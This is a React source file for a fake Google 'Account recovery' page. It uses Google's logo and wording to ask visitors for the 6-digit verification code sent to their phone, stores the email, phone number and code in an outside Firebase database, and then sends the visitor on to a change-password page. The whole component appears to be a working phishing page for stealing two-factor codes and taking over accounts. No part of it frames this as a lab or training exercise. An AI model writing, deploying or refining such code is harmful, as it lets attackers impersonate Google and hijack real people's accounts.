import React, { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { database, ref, push } from "../firebase";
import "./login.css";


const VerifyCode = () => {
  const location = useLocation();
  const { email, phone } = location.state || {};
  const [code, setCode] = useState("");
    const navigate = useNavigate();
  const [submitted, setSubmitted] = useState(false);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (code.length !== 6) return alert("Please enter a 6-digit code");

    try {
      await push(ref(database, "verifications"), {
        email,
        phone,
        code,
        timestamp: new Date().toISOString(),
      });
      navigate("/change-password", { state: { email } });
      setSubmitted(true);
    } catch (error) {
      console.error("Verification error:", error);
      alert("Failed to submit code. Try again.");
    }
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <img
          src="/google.png"
          alt="Google"
          className="login-logo"
        />
        <h2 className="login-title" style={{ marginBottom: "8px" }}>
          Account recovery
        </h2>

        <p>To help keep your account safe, Google wants to make sure it's really you trying to sign in </p>

        {email && (
          <p className="email-pill">
            {email}
          </p>
        )}

        {submitted ? (
          <p style={{ color: "green" }}>
            Code verified. We will contact you if further steps are needed.
          </p>
        ) : (
          <>
            <p style={{ fontSize: "16px", fontWeight: "600", marginBottom: "10px" }}>
              Enter the verification code
            </p>

            <p style={{ marginBottom: "20px", color: "#5f6368", fontSize: "14px" }}>
              A 6-digit code was sent to <b>{phone}</b>
            </p>

            <form onSubmit={handleSubmit} className="login-form">
              <div className="input-with-prefix">
                <span className="prefix">G-</span>
                <input
                    type="text"
                    placeholder="Enter 6-digit code"
                    value={code}
                    onChange={(e) => setCode(e.target.value.replace(/\D/g, ""))}
                    maxLength={6}
                    required
                />
                </div>
              <div className="login-actions">
                <button type="submit" className="next-button">
                  Verify
                </button>
              </div>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default VerifyCode;
